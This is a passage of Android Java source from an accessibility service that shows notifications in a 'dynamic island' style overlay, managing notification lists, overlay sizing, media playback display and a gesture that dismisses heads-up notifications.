                updateNotificationItem(notification3, i4);

                adapter_island_small.notifyItemChanged(i4);
                if (prefManager.getShowNotification()) {
                    if (equals || notification3.template.equals("InboxStyle") || notification3.tag.toLowerCase().contains("summary")) {

                        if (notification3.template.equals("MediaStyle")) {

                            if (isMusic) {
                                notification = notification3;
                                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        list_big_island.clear();
                                        list_big_island.add(notification3);
                                        adapter_island_big.notifyItemChanged(0);
                                        setMediaUpdateHandler();
                                        adapter_island_big.notifyDataSetChanged();
                                    }
                                }, 500L);
                            }
                            if (lastUpdateTime + 5000 < System.currentTimeMillis()) {
                                packNameMusicUpdateLastUpdate = notification3.pack;
                                lastUpdateTime = System.currentTimeMillis();
//                           scrollToPos(i4);
                            }

                        }
                        return;
                    }
                }
                if (notification3.groupKey.contains("Download") || notification3.groupKey.contains("download")) {

                    if (prefManager.getShowNotification()) {
                        Log.e(TAG, "notifi_download_3");
                        if (isShowFullIsland) {
                            adapter_island_big.notifyItemChanged(0);
                        }
                    }
                }

                if (notification3.category.equals("missed_call")) {
                    if (prefManager.getShowNotification()) {
                        scrollToPos(i4);
                    }
//                   showSmallIslandNotification();
                }

//                }
            } else {
                if (notificationMusic != null && notificationMusic.groupKey.equals(notification3.groupKey)) {
                    notificationMusic = notification3;
                    circleImageMusic.setImageBitmap(notification3.senderIcon);
                    notification = notification3;
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            list_big_island.clear();
                            list_big_island.add(notification3);
                            adapter_island_big.notifyItemChanged(0);
                            setMediaUpdateHandler();
                            adapter_island_big.notifyDataSetChanged();
                        }
                    }, 500L);
                } else {


                    if (notification3.template.equals("MediaStyle")) {
                        isNotchShowAction = true;
                        if (prefManager.getShowNotificationMusic()) {
                            packNameMusicUpdateLastUpdate = notification3.pack;
                            lastUpdateTime = System.currentTimeMillis();
                            this.list_small_island.add(notification3);
                            scrollToLastItem();
                        }
                    } else if (notification3.category.equals("navigation")) {
                        isNotchShowAction = true;
                        if (prefManager.getShowNotificationNavigation()) {
                            this.list_small_island.add(notification3);
                            scrollToLastItem();
                        }

                    } else if (notification3.category.equals("missed_call")) {

                        this.list_small_island.add(notification3);
                        scrollToLastItem();


                    } else {
                        isNotchShowAction = true;
                        this.list_small_island.add(notification3);

                        if (notification3.category.equalsIgnoreCase(NotificationCompat.CATEGORY_CALL)) {
//                            showSmallIslandNotification();
                            return;
                        } else {
                            scrollToLastItem();
                            showSmallIslandNotification();
                        }
                    }


//                    notifyDataSetChanged();

                }
            }
            notification2 = notification3;
            notification2.icon = bmIcon;
            notification2.picture = bmPicture;
            Log.e(TAG, "updateNotificationList: add notifi");
        } else {

            String str10 = str5;
            for (int size = this.list_small_island.size() - 1; size >= 0; size--) {
                if (!this.list_small_island.get(size).isLocal && this.list_small_island.get(size).key.equals(str10)) {
                    this.list_small_island.remove(size);
                }

            }


            if (notificationMusic != null && str4 != null && str4.equals(notificationMusic.groupKey)) {
                notificationMusic = null;
                circleImageMusic.setVisibility(View.GONE);
            }
            isNotchShowAction = false;

            notifyDataSetChanged();
        }
        if (!isFilterPkgFound(mPackageName)) {
            if (notification2 == null || !notification2.category.equalsIgnoreCase(NotificationCompat.CATEGORY_CALL)) {
//                showSmallIslandNotification();
            } else if (Constants.getAutoCloseNoti(this.mContext) && notification2.isOngoing) {
                //   closeHeadsUpNotification(notification2);
            } else if (!notification2.isOngoing || notification2.actions == null) {
                this.currentIndex = this.list_small_island.size() - 1;
                closeFullNotificationIsland();
            } else {
                this.notification = notification2;
//                isCall = true;
//                showFullIslandNotification(notification2);
            }
            notifyDataSetChanged();
        }
    }


    public void rotateImageViewInfinity() {
        if (prefManager.getShowNotificationMusicRotate()) {
            animator.setDuration(3000L);
            animator.setRepeatCount(Animation.INFINITE);
            animator.setRepeatMode(ValueAnimator.RESTART);
            animator.start();
        }
    }

    public void stopRotateImageViewInfinity() {
        if (animator != null) {
            animator.cancel();
        }
    }

//    private void scrollToPos(Notification notification3) {
//        int position = 0;
//        if (!list_small_island.isEmpty()) {
//            for (int i = 0; i < list_small_island.size(); i++) {
//                String packageName = list_small_island.get(i).getPack();
//                if (packageName.equals(notification3.pack)) {
//                    position = i;
//                }
//            }
//        }
//        scrollToPos(position);
//    }


    public void notifyDataSetChanged() {
        if (prefManager.getShowNotification()) {
            this.adapter_island_small.notifyDataSetChanged();
            this.adapter_island_big.notifyDataSetChanged();
            showSmallIslandNotification();
        }
        Log.e(TAG, "showSmallIslandNotification 1: ");
//        scrollToLastItem();
    }

    public void setKeyboardFlag(final boolean z) {
        new Handler().postDelayed(new Runnable() {
            @SuppressLint("WrongConstant")
            public void run() {
                if (z) {
                    ITGAccessibilityService.this.localLayoutParams.flags = ITGAccessibilityService.this.flagKeyBoard;
                } else {
                    ITGAccessibilityService.this.localLayoutParams.flags = ITGAccessibilityService.this.flagNormal;
                }
                if (statusBarView.getParent() != null && manager != null) {
                    try {
                        ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }, 300);
    }

    public void closeSmallIslandNotification() {
//        Log.e(TAG, "closeSmallIslandNotification ahuhu: ");
//        LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) this.island_parent_layout.getLayoutParams();
//        layoutParams.width = (int) (this.utils.convertDpToPixel(1.0f, this.mContext) * getResources().getDisplayMetrics().scaledDensity);
//        layoutParams.height = (int) (this.utils.convertDpToPixel(1.0f, this.mContext) * getResources().getDisplayMetrics().scaledDensity);
//        this.island_parent_layout.setLayoutParams(layoutParams);
//        setKeyboardFlag(false);
//        new Handler().postDelayed(new MAccessibilityServiceRunable(this), 500);
    }

    public void run() {
        if (minHeight == 0) {
            this.localLayoutParams.height = (int) (this.utils.convertDpToPixel(1.0f, this.mContext) * getResources().getDisplayMetrics().scaledDensity);
        } else {
            this.localLayoutParams.height = minHeight;
        }
        if (minWidth == 0) {
            this.localLayoutParams.width = (int) (this.utils.convertDpToPixel(1.0f, this.mContext) * getResources().getDisplayMetrics().scaledDensity);
        } else {
            this.localLayoutParams.width = minWidth;
        }
        if (statusBarView.getParent() != null && manager != null) {
            this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
            this.island_top_layout.setVisibility(View.GONE);
        }
    }

    public void m110lambda$new$2$comlockservicesMAccessibilityService() {
        if (this.list_small_island.size() == 0) {
            closeSmallIslandNotification();
        }
    }

    public void showTempBar() {
        this.island_top_layout.setVisibility(View.VISIBLE);
        int width = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_WIDTH, 130);
        int height = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_HEIGHT, 25);
        int overlay_x = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_X, 0);
        int overlay_y = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_Y, 5);
        minWidth = (int) (width * getResources().getDisplayMetrics().scaledDensity);
        minHeight = (int) (height * getResources().getDisplayMetrics().scaledDensity);
        x = (int) (overlay_x * 0.01 * metrics.widthPixels);
        y = (int) (overlay_y * 0.01 * metrics.heightPixels);
        if (minHeight == 0) {
            this.localLayoutParams.height = (int) (((float) this.prefManager.getHeightOfIsland()) * getResources().getDisplayMetrics().scaledDensity);
        } else {
            this.localLayoutParams.height = minHeight;
        }
        if (minWidth == 0) {
            this.localLayoutParams.width = this.minCameIslandWidth;
        } else {
            this.localLayoutParams.width = minWidth;
        }
        this.localLayoutParams.x = x;
        this.localLayoutParams.y = y;
        if (statusBarView.getParent() != null && manager != null) {
            this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
            LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) this.island_parent_layout.getLayoutParams();
            layoutParams.width = -1;
            layoutParams.height = -1;
            this.island_parent_layout.setLayoutParams(layoutParams);
        }
//        this.mHandle.removeCallbacks(this.mRunnable);
//        this.mHandle.postDelayed(this.mRunnable, 3000);
    }

    public long getMediaDuration() {
        try {
            return ((MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE)).getActiveSessions(new ComponentName(getApplicationContext(), NotificationService.class)).get(0).getMetadata().getLong(MediaMetadata.METADATA_KEY_DURATION);
        } catch (Exception unused) {
            return 1;
        }
    }

    public long getMediaPosition() {
        try {
            return ((MediaSessionManager) getSystemService(Context.MEDIA_SESSION_SERVICE)).getActiveSessions(new ComponentName(getApplicationContext(), NotificationService.class)).get(0).getPlaybackState().getPosition();
        } catch (Exception unused) {
            return 0;
        }
    }


    public boolean isShowingSmall() {
        return this.localLayoutParams.width == this.minCameIslandWidth && this.island_top_layout.getVisibility() == View.VISIBLE;
    }

    public void showSmallIslandNotification() {

        if (prefManager.getShowNotification()) {
            new Handler().postDelayed(new Runnable() {
                public void run() {
                    Log.e(TAG, "showSmallIslandNotification isShowFullIsland: " + isShowFullIsland);
                    if (isShowFullIsland) {
                        return;
                    }
                    if (prefManager.getShowNotification()) {

                        rv_island_small.setVisibility(View.VISIBLE);
                    }


                    if (list_big_island.isEmpty()) {
                        rv_island_big.setVisibility(View.GONE);
                        Log.e(TAG, "rv_island_big GONE 2: ");
                    }

//                if (ITGAccessibilityService.this.adapter_island_small.getItemCount() >= 1) {
//                       //  ITGAccessibilityService.this.rv_island_small.scrollToPosition(ITGAccessibilityService.this.adapter_island_small.getItemCount() - 1);
//                }

                    if (!ITGAccessibilityService.this.isControlEnabled) {

                    } else {
                        if ((ITGAccessibilityService.this.isPhoneLocked && !Constants.getShowOnLock(ITGAccessibilityService.this.mContext)) || ITGAccessibilityService.this.isShowingFullIsland()) {
                            return;
                        }
                        if (!ITGAccessibilityService.this.isInFullScreen || Constants.getShowInFullScreen(ITGAccessibilityService.this.mContext)) {
                            ITGAccessibilityService.this.island_top_layout.setVisibility(View.VISIBLE);
                            if (prefManager.getShowNotification()) {
                                ITGAccessibilityService.this.rv_island_small.setVisibility(View.VISIBLE);
                            }
                            ITGAccessibilityService.this.rv_island_big.setVisibility(View.GONE);
                            Log.e(TAG, "rv_island_big GONE 3: ");
                            if (ITGAccessibilityService.this.list_small_island.isEmpty()) {
//                            LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) ITGAccessibilityService.this.island_parent_layout.getLayoutParams();
//                            layoutParams.width = (int) (ITGAccessibilityService.this.getResources().getDisplayMetrics().scaledDensity * 0.0f);
//                            ITGAccessibilityService.this.island_parent_layout.setLayoutParams(layoutParams);
                                return;
                            }

                            if (minHeight == 0) {
                                ITGAccessibilityService.this.localLayoutParams.height = (int) (((float) ITGAccessibilityService.this.prefManager.getHeightOfIsland()) * ITGAccessibilityService.this.getResources().getDisplayMetrics().scaledDensity);
                            } else {
                                ITGAccessibilityService.this.localLayoutParams.height = minHeight;
                            }
                            if (minWidth == 0) {
                                ITGAccessibilityService.this.localLayoutParams.width = ITGAccessibilityService.this.minCameIslandWidth;
                            } else {
                                ITGAccessibilityService.this.localLayoutParams.width = minWidth;
                            }
                            if (statusBarView.getParent() != null && manager != null) {
                                ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);
                                LinearLayout.LayoutParams layoutParams2 = (LinearLayout.LayoutParams) ITGAccessibilityService.this.island_parent_layout.getLayoutParams();
                                layoutParams2.width = -1;
                                layoutParams2.height = -1;
                                ITGAccessibilityService.this.island_parent_layout.setLayoutParams(layoutParams2);
                                if (ITGAccessibilityService.this.adapter_island_small.getItemCount() >= 1) {
//                                ITGAccessibilityService.this.rv_island_small.scrollToPosition(ITGAccessibilityService.this.adapter_island_small.getItemCount() - 1);
                                }
                            }
                        }
                    }
                    if (countMultiTask < 2 && notificationCall == null) {
                        new Handler().postDelayed(() -> {
                            int current = -1;
                            if (!list_small_island.isEmpty()) {
                                int size = list_small_island.size();
                                for (int i = 0; i < size; i++) {
                                    if (list_small_island.get(i).getTemplate().contains("MediaStyle")) {
                                        current = i;
                                    }
                                }
                            }
                            if (current != -1) {
                                if (adapter_island_small.getItemCount() > 0) {

                                    for (int i = 0; i < list_small_island.size(); i++) {
                                        try {
                                            if (!list_small_island.get(i).pack.isEmpty() && !packNameMusicUpdateLastUpdate.isEmpty()) {
                                                if (list_small_island.get(i).pack.equals(packNameMusicUpdateLastUpdate)) {
                                                    rv_island_small.scrollToPosition(i);
                                                    return;
                                                }
                                            }
                                        } catch (Exception ignored) {

                                        }

                                    }
                                    rv_island_small.scrollToPosition(current);
                                }
                            }
                        }, 500);
                    } else if (countMultiTask >= 2) {
                        int current = -1;
                        if (!list_small_island.isEmpty()) {
                            int size = list_small_island.size();
                            for (int i = 0; i < size; i++) {
                                if (list_small_island.get(i).category.equals("navigation")) {
                                    current = i;
                                }
                            }
                            rv_island_small.scrollToPosition(current);
                        }
                    }


                }
            }, 2000);
        } else {
            rv_island_small.setVisibility(View.GONE);
        }


//        scrollToMusic();
    }

    public void closeHeadsUpNotification(final Notification notification2) {
        new Handler().postDelayed(new Runnable() {
            @RequiresApi(api = Build.VERSION_CODES.N)
            public void run() {
                DisplayMetrics displayMetrics = ITGAccessibilityService.this.getResources().getDisplayMetrics();
                GestureDescription.Builder builder = new GestureDescription.Builder();
                Path path = new Path();
                double d = (double) displayMetrics.heightPixels;
                float f = (float) ((displayMetrics.widthPixels / 2) + (displayMetrics.widthPixels / 4));
                path.moveTo(f, (float) (d * 0.1d));
                path.lineTo(f, (float) (0.01d * d));
                builder.addStroke(new GestureDescription.StrokeDescription(path, 100, 50));
                ITGAccessibilityService.this.dispatchGesture(builder.build(), new GestureResultCallback() {
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                        ITGAccessibilityService.this.showFullIslandNotification(notification2);
                    }
                }, (Handler) null);
            }
        }, 700);
    }

    private void setMediaUpdateHandler() {
        this.mediaHandler.postDelayed(this.mediaUpdateRunnable, 1000L);
    }

    public boolean isShowingFullIsland() {
        return this.localLayoutParams.height == -1 && this.island_top_layout.getVisibility() == View.VISIBLE;
    }


    private boolean isShowingFullIsland = false;

    @SuppressLint("WrongConstant")
    public void showQuickAction() {
        if (statusBarView.getParent() != null && manager != null) {
            this.localLayoutParams.height = minHeight;
            isShowFullIsland = true;
            Log.e(TAG, "showQuickAction: " + minWidth);
            this.localLayoutParams.width = minWidth + 200;
            if (x != 0) {
                this.localLayoutParams.x = 0;
            }
            this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
            LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) this.island_parent_layout.getLayoutParams();
            layoutParams.width = -1;
            this.island_parent_layout.setLayoutParams(layoutParams);
            CountDownTimer countDownTimer = new CountDownTimer(2000, 100) {
                @Override
                public void onTick(long millisUntilFinished) {
                    isShowingFullIsland = true;
                }

                @Override
                public void onFinish() {
                    isShowFullIsland = false;
                    if (constraintMode.getVisibility() == View.VISIBLE) {
                        constraintMode.setVisibility(View.GONE);
                        Log.e(TAG, "BATTERY_CHANGED GONE: ");
                    }
                    localLayoutParams.height = minHeight;
                    localLayoutParams.width = minWidth;
                    if (x != 0) {
                        localLayoutParams.x = x;
                    }
                    if (statusBarView.getParent() != null && manager != null) {
                        try {
                            manager.updateViewLayout(statusBarView, localLayoutParams);
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                    isShowingFullIsland = false;
                    closeFullNotificationIsland();
                }
            };
            countDownTimer.start();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (Utils.isServiceRunning(mContext, NotificationService.class.getName()) && countReboot == 0) {
                        NotificationService.getInstance().initNotification();
                        countReboot++;
                    }
                }
            }, 3000);
        }
    }

    @SuppressLint("WrongConstant")
    public void showFullIslandNotification(Notification notification2) {
        this.notification = notification2;
        this.rv_island_big.setAdapter(adapter_island_big);
        try {
            if (!notification2.isLocal) {
                isShowFullIsland = true;
                this.island_top_layout.setVisibility(View.VISIBLE);
                this.rv_island_small.setVisibility(View.GONE);
                if (circleImageMusic.getVisibility() == View.VISIBLE) {
                    circleImageMusic.setVisibility(View.GONE);
                }
                if (isShowingFullIsland()) {
                    this.list_big_island.clear();
                    this.list_big_island.add(notification2);
                    this.adapter_island_big.notifyItemChanged(0);
                    return;
                }
                if (notification2.template.equals("MediaStyle")) {
                    setMediaUpdateHandler();
                    isMusic = true;
                }
                if (notification2.groupKey.contains("Download") || notification2.groupKey.contains("download")) {
                    isMusic = true;
                }
                setFullIslandMargin(true);
                setKeyboardFlag(true);
                this.localLayoutParams.height = ViewGroup.LayoutParams.MATCH_PARENT;
                this.localLayoutParams.width = ViewGroup.LayoutParams.MATCH_PARENT;
                this.localLayoutParams.gravity = 49;
                LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) this.island_parent_layout.getLayoutParams();
                layoutParams.width = -1;
                if (notification2.category.equalsIgnoreCase(NotificationCompat.CATEGORY_CALL) && notification2.isOngoing) {
                    layoutParams.height = (int) (getResources().getDisplayMetrics().scaledDensity * 90.0f);
                } else if (notification2.actions == null || notification2.actions.isEmpty()) {
                    layoutParams.height = (int) (getResources().getDisplayMetrics().scaledDensity * 110.0f);
                } else {
                    layoutParams.height = (int) (getResources().getDisplayMetrics().scaledDensity * 180f);
                }
                int tempY = 0;
                if (y + layoutParams.height >= metrics.heightPixels) {
                    tempY = metrics.heightPixels - layoutParams.height;
                    localLayoutParams.y = tempY;
                }
                this.island_parent_layout.setLayoutParams(layoutParams);
                this.rv_island_big.setVisibility(View.VISIBLE);
                this.list_big_island.clear();
                this.list_big_island.add(notification2);
                Log.e(TAG, "showFullIslandNotification list_big_island: " + list_big_island.get(0));
                this.adapter_island_big.notifyItemChanged(0);
                if (statusBarView.getParent() != null && manager != null) {
                    this.localLayoutParams.width = ViewGroup.LayoutParams.MATCH_PARENT;
                    if (x != 0) {
                        this.localLayoutParams.x = 0;
                    }
                    try {
                        this.manager.updateViewLayout(this.statusBarView, this.localLayoutParams);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
            }
        } catch (Exception ex) {

        }

    }

    public void closeFullNotificationIsland() {
        this.mediaHandler.removeCallbacks(this.mediaUpdateRunnable);
        setFullIslandMargin(false);
        setKeyboardFlag(false);
        isShowFullIsland = false;
        isMusic = false;

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            public void run() {
                if (ITGAccessibilityService.this.statusBarView.getParent() != null && ITGAccessibilityService.this.manager != null) {
                    if (prefManager.getShowNotification()) {
                        ITGAccessibilityService.this.rv_island_small.setVisibility(View.VISIBLE);
                    }
                    ITGAccessibilityService.this.rv_island_big.setVisibility(View.GONE);
                    LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) ITGAccessibilityService.this.island_parent_layout.getLayoutParams();
                    layoutParams.width = -1;
                    layoutParams.height = -1;
                    ITGAccessibilityService.this.island_parent_layout.setLayoutParams(layoutParams);
                    ITGAccessibilityService.this.island_parent_layout.invalidate();
                    ITGAccessibilityService.this.statusBarView.invalidate();
                    if (minHeight == 0) {
                        ITGAccessibilityService.this.localLayoutParams.height = (int) (25 * ITGAccessibilityService.this.getResources().getDisplayMetrics().scaledDensity);
                    } else {
                        ITGAccessibilityService.this.localLayoutParams.height = minHeight;
                    }
                    if (minWidth == 0) {
                        ITGAccessibilityService.this.localLayoutParams.width = (int) (130 * ITGAccessibilityService.this.getResources().getDisplayMetrics().scaledDensity);
                    } else {
                        ITGAccessibilityService.this.localLayoutParams.width = minWidth;
                    }
                    if (x != 0) ITGAccessibilityService.this.localLayoutParams.x = x;
                    if (y != (int) (5 * 0.01 * metrics.heightPixels))
                        ITGAccessibilityService.this.localLayoutParams.y = y;
                    if (ITGAccessibilityService.this.statusBarView.getParent() != null && ITGAccessibilityService.this.manager != null) {
                        try {
                            ITGAccessibilityService.this.manager.updateViewLayout(ITGAccessibilityService.this.statusBarView, ITGAccessibilityService.this.localLayoutParams);

                            if (notificationMusic != null && circleImageMusic.getVisibility() == View.GONE) {
                                circleImageMusic.setVisibility(View.VISIBLE);
                                showSmallIslandNotification();
                                Log.e(TAG, "showSmallIslandNotification 5: ");
                            }
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    }
                }
            }
        }, 100);
        adapter_island_small.notifyDataSetChanged();
    }


    private boolean isSameItem(Notification notification2) {
        if (notification2.pack.equals("com.whatsapp") && notification2.template.equals("")) {
            return true;
        }
        if (!notification2.pack.equals("com.google.android.gm") || !notification2.id.equals("0")) {
            return false;
        }
        return true;
    }

    private void updateNotificationItem(Notification notification2, int i) {
        this.list_small_island.get(i).senderIcon = notification2.senderIcon;
        this.list_small_island.get(i).icon = notification2.icon;
        this.list_small_island.get(i).actions = notification2.actions;
        this.list_small_island.get(i).pendingIntent = notification2.pendingIntent;
        this.list_small_island.get(i).tv_title = notification2.tv_title;
        this.list_small_island.get(i).tv_text = notification2.tv_text;
        this.list_small_island.get(i).pack = notification2.pack;
        this.list_small_island.get(i).postTime = notification2.postTime;
        this.list_small_island.get(i).count = notification2.count;
        this.list_small_island.get(i).bigText = notification2.bigText;
        this.list_small_island.get(i).app_name = notification2.app_name;
        this.list_small_island.get(i).isClearable = notification2.isClearable;
        this.list_small_island.get(i).color = notification2.color;
        this.list_small_island.get(i).picture = notification2.picture;
        this.list_small_island.get(i).id = notification2.id;
        this.list_small_island.get(i).template = notification2.template;
        this.list_small_island.get(i).key = notification2.key;
        this.list_small_island.get(i).groupKey = notification2.groupKey;
        this.list_small_island.get(i).isAppGroup = notification2.isAppGroup;
        this.list_small_island.get(i).isGroup = notification2.isGroup;
        this.list_small_island.get(i).isOngoing = notification2.isOngoing;
        this.list_small_island.get(i).isGroupConversation = notification2.isGroupConversation;
        this.list_small_island.get(i).showChronometer = notification2.showChronometer;
        this.list_small_island.get(i).progress = notification2.progress;
        this.list_small_island.get(i).progressMax = notification2.progressMax;
        this.list_small_island.get(i).progressIndeterminate = notification2.progressIndeterminate;
        this.list_small_island.get(i).category = notification2.category;
    }

    private void initNotifications() {
        this.rv_island_big = (CustomRecyclerView) this.statusBarView.findViewById(R.id.rv_island_big);
        this.rv_island_small = (RecyclerView) this.statusBarView.findViewById(R.id.rv_island_small);
        CustomNotificationIconAdapter customNotificationIconAdapter = new CustomNotificationIconAdapter(this, this.list_small_island, new NotificationListener() {
            @Override
            public void onItemClicked(Notification notification) {
            }

            @Override
            public void onCloseFullNotification(Notification notification) {
//                closeFullNotificationIsland();
            }

            @Override
            public void onItemClicked(Notification notification, int i, boolean longClick) {
                if (enableClick) {
                    Log.e(TAG, "onItemClicked: " + notification);
                    if (longClick) {
                        try {
                            if (notification.pendingIntent != null) {
                                notification.pendingIntent.send();
                            }
                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                    } else {
                        ITGAccessibilityService.this.showFullIslandNotification(notification);
                        ITGAccessibilityService.this.currentIndex = i;
                    }
                } else {
                    return;
                }

            }

            @Override
            public void onDeleteItem(Notification notification, int i) {
                list_small_island.remove(notification);
                scrollToLastItem();
            }

            @Override
            public void onLongItemClicked(Notification notification, int i) {
                try {
                    if (notification.pendingIntent != null) {
                        notification.pendingIntent.send();
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }, prefManager);
        this.adapter_island_small = customNotificationIconAdapter;
        this.rv_island_small.setAdapter(customNotificationIconAdapter);
        this.rv_island_small.setHasFixedSize(true);
        this.rv_island_small.addItemDecoration(new ItemOffsetDecoration2(this, R.dimen.small_margin));
        LinearLayoutManager linearLayoutManager = new LinearLayoutManager(this) {
            @Override
            public boolean canScrollHorizontally() {
                return false;
            }
        };
        linearLayoutManager.setOrientation(RecyclerView.HORIZONTAL);
        this.rv_island_small.setLayoutManager(linearLayoutManager);
        this.adapter_island_big = new CustomNotificationAdapter(mContext, this.list_big_island, new NotificationListener() {
            @Override
            public void onCloseFullNotification(Notification notification) {
                if (notification.template.equals("MediaStyle")) return;
                closeFullNotificationIsland();
            }

            public void onItemClicked(Notification notification) {
                ITGAccessibilityService.this.closeFullNotificationIsland();
            }

            public void onItemClicked(Notification notification, int i, boolean longClick) {
            }

            @Override
            public void onLongItemClicked(Notification notification, int i) {

            }

            @Override
            public void onDeleteItem(Notification notification, int i) {
//                list_big_island.remove( notification);
            }
        });
        LinearLayoutManager linearLayoutManager2 = new LinearLayoutManager(mContext) {
            @Override
            public boolean canScrollVertically() {
                return false;
            }
        };
        linearLayoutManager2.setOrientation(RecyclerView.VERTICAL);
        this.rv_island_big.setAdapter(adapter_island_big);
        this.rv_island_big.setHasFixedSize(true);
        this.rv_island_big.addItemDecoration(new ItemOffsetDecoration2(mContext, R.dimen.small_margin));
        this.rv_island_big.setLayoutManager(linearLayoutManager2);
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent.getIntExtra("com.control.center.intent.MESSAGE", -1) == 0) {
            try {
                if (Build.VERSION.SDK_INT >= 24) {
                    disableSelf();
                }
            } catch (Exception unused) {
            }
        }
        return super.onStartCommand(intent, i, i2);
    }

    private void enableControls(boolean z) {
        this.isControlEnabled = z;
        if (!z) {
            closeSmallIslandNotification();
        } else {
            showTempBar();
        }
    }

    public void onConfigurationChanged(Configuration configuration) {
        super.onConfigurationChanged(configuration);
        updateFontSize(configuration);
    }

    public final void updateFontSize(Configuration configuration) {
        if (configuration.fontScale > 1.3f) {
            configuration.fontScale = 1.3f;
            DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
            ((WindowManager) getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay().getMetrics(displayMetrics);
            displayMetrics.scaledDensity = configuration.fontScale * displayMetrics.density;
            getResources().updateConfiguration(configuration, displayMetrics);
        }
    }

    public void onDestroy() {
        GlobalApp.instance.setAccessibilityActive(false);
        Context context;
        Context context2;
        SharedPreferences.OnSharedPreferenceChangeListener onSharedPreferenceChangeListener;
        View view;
        try {
            WindowManager windowManager = this.manager;
            if (!(windowManager == null || (view = this.statusBarParentView) == null)) {
                windowManager.removeView(view);
            }
            SharedPreferences sharedPreferences = this.preferences;
            if (!(sharedPreferences == null || (onSharedPreferenceChangeListener = this.listener) == null)) {
                sharedPreferences.unregisterOnSharedPreferenceChangeListener(onSharedPreferenceChangeListener);
            }
            if (!(this.notiReceiver == null || (context2 = this.mContext) == null)) {
                LocalBroadcastManager.getInstance(context2).unregisterReceiver(this.notiReceiver);
            }
            BroadcastReceiver broadcastReceiver = this.mInfoReceiver;
            if (!(broadcastReceiver == null || (context = this.mContext) == null)) {
                context.unregisterReceiver(broadcastReceiver);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        super.onDestroy();
    }


    public void scrollToPos(int i) {
        this.adapter_island_small.notifyDataSetChanged();
        if (!isShowingSmall()) {
            showSmallIslandNotification();
            Log.e(TAG, "showSmallIslandNotification 4: ");
        }
        if (this.adapter_island_small.getItemCount() > 0) {
            this.rv_island_small.scrollToPosition(i);
        }
    }


    @SuppressLint("NotifyDataSetChanged")
    public void scrollToLastItem() {
        if (prefManager.getShowNotification()) {

            this.adapter_island_small.notifyDataSetChanged();
            if (this.adapter_island_small.getItemCount() > 0) {
                this.rv_island_small.scrollToPosition(this.adapter_island_small.getItemCount() - 1);
            }
        }
//        showSmallIslandNotification();
    }

    private class MAcceExternalSyntheticLambda implements Runnable {

        MAcceExternalSyntheticLambda aaa;

        public MAcceExternalSyntheticLambda(Runnable runnable) {
        }

        @Override
        public void run() {
            LinearLayout.LayoutParams layoutParams = (LinearLayout.LayoutParams) ITGAccessibilityService.this.island_parent_layout.getLayoutParams();
            layoutParams.width = -1;
            layoutParams.height = -1;
            ITGAccessibilityService.this.island_parent_layout.setLayoutParams(layoutParams);
            if (ITGAccessibilityService.this.adapter_island_small.getItemCount() > ITGAccessibilityService.this.currentIndex) {
                //   ITGAccessibilityService.this.rv_island_small.scrollToPosition(ITGAccessibilityService.this.currentIndex);
            }
        }
    }

    public AccessibilityController getAccessibilityController() {
        return accessibilityController;
    }
}
